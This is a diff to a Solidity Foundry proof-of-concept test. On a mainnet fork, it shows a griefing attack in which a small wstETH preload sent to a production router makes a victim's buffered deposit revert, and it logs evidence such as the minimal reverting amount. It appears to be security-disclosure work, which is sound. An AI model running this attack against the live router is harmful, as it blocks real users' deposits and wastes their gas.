@@ -23,9 +23,9 @@ contract VictimDepositWorkflow {
         SDEX = sdex;
     }
 
-    function run(uint256 intendedAssetAmount, uint256 exactSdexBudget, uint256 securityDeposit) external {
+    function run(uint256 intendedAssetAmount, uint256 sdexBudget, uint256 securityDeposit) external {
         require(ASSET.transfer(address(ROUTER), intendedAssetAmount), "asset transfer");
-        require(SDEX.transfer(address(ROUTER), exactSdexBudget), "sdex transfer");
+        require(SDEX.transfer(address(ROUTER), sdexBudget), "sdex transfer");
 
         bytes[] memory priceData = new bytes[](0);
         uint128[] memory rawIndices = new uint128[](0);
@@ -66,6 +66,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
     address internal constant ATTACKER = address(0xB0B);
     uint256 internal constant FORK_BLOCK = 25_715_274;
     uint256 internal constant INTENDED_DEPOSIT = 0.1 ether;
+    uint256 internal constant SDEX_BUFFER_BPS = 50; // ~0.5%, matching observed production Router deposits
     uint256 internal constant SEARCH_HIGH = 0.001 ether;
 
     IUniversalRouter internal router;
@@ -74,7 +75,8 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
     IERC20 internal sdex;
     VictimDepositWorkflow internal victim;
     uint256 internal securityDeposit;
-    uint256 internal exactSdexBudget;
+    uint256 internal quotedSdexBurn;
+    uint256 internal victimSdexBudget;
 
     function setUp() public {
         string memory rpc = vm.envString("MAINNET_RPC_URL");
@@ -89,12 +91,13 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         securityDeposit = protocol.getSecurityDepositValue();
         uint128 lastPrice = protocol.getLastPrice();
         uint128 lastTimestamp = protocol.getLastUpdateTimestamp();
-        (, exactSdexBudget) = protocol.previewDeposit(INTENDED_DEPOSIT, lastPrice, lastTimestamp);
+        (, quotedSdexBurn) = protocol.previewDeposit(INTENDED_DEPOSIT, lastPrice, lastTimestamp);
+        victimSdexBudget = (quotedSdexBurn * (10_000 + SDEX_BUFFER_BPS) + 9_999) / 10_000;
 
         deal(address(asset), ROUTER_ADDR, 0);
         deal(address(sdex), ROUTER_ADDR, 0);
         deal(address(asset), address(victim), INTENDED_DEPOSIT);
-        deal(address(sdex), address(victim), exactSdexBudget);
+        deal(address(sdex), address(victim), victimSdexBudget);
         vm.deal(address(victim), securityDeposit);
         vm.deal(ATTACKER, 1 ether);
 
@@ -102,7 +105,9 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         emit log_named_address("EVIDENCE_asset", address(asset));
         emit log_named_address("EVIDENCE_sdex", address(sdex));
         emit log_named_uint("EVIDENCE_security_deposit", securityDeposit);
-        emit log_named_uint("EVIDENCE_exact_sdex_budget_wei", exactSdexBudget);
+        emit log_named_uint("EVIDENCE_quoted_sdex_burn_wei", quotedSdexBurn);
+        emit log_named_uint("EVIDENCE_sdex_buffer_bps", SDEX_BUFFER_BPS);
+        emit log_named_uint("EVIDENCE_buffered_sdex_budget_wei", victimSdexBudget);
     }
 
     function _trial(uint256 preload) internal returns (bool success_) {
@@ -115,7 +120,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         }
 
         (success_,) = address(victim).call(
-            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, exactSdexBudget, securityDeposit))
+            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, victimSdexBudget, securityDeposit))
         );
 
         bool reverted = vm.revertTo(snap);
@@ -123,8 +128,8 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
     }
 
     function _findMinimalRevertingPreload() internal returns (uint256 minimalPreload_) {
-        assertTrue(_trial(0), "clean victim route must succeed");
-        assertFalse(_trial(SEARCH_HIGH), "search upper bound must revert victim route");
+        assertTrue(_trial(0), "clean buffered victim route must succeed");
+        assertFalse(_trial(SEARCH_HIGH), "search upper bound must revert buffered victim route");
 
         uint256 lo;
         uint256 hi = SEARCH_HIGH;
@@ -143,7 +148,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
     }
 
     function test_control_exactOfficialBudgetSucceedsWithoutPreload() public {
-        victim.run(INTENDED_DEPOSIT, exactSdexBudget, securityDeposit);
+        victim.run(INTENDED_DEPOSIT, victimSdexBudget, securityDeposit);
         assertEq(asset.balanceOf(ROUTER_ADDR), 0, "normal route leaves no asset dust");
         assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "normal route leaves no SDEX dust");
 
@@ -159,6 +164,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         uint256 minimalPreload = _findMinimalRevertingPreload();
         emit log_named_uint("EVIDENCE_minimal_reverting_preload_wei_wstETH", minimalPreload);
         emit log_named_uint("EVIDENCE_threshold_minus_one_wei_wstETH", minimalPreload - 1);
+        emit log_named_uint("EVIDENCE_preload_bps_of_intended_deposit", minimalPreload * 10_000 / INTENDED_DEPOSIT);
 
         deal(address(asset), ATTACKER, minimalPreload);
         vm.prank(ATTACKER);
@@ -169,7 +175,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         uint256 victimSdexBefore = sdex.balanceOf(address(victim));
         uint256 gasBefore = gasleft();
         (bool ok, bytes memory revertData) = address(victim).call(
-            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, exactSdexBudget, securityDeposit))
+            abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, victimSdexBudget, securityDeposit))
         );
         uint256 victimCallGas = gasBefore - gasleft();
         emit log_named_uint("EVIDENCE_reverted_victim_call_gas", victimCallGas);
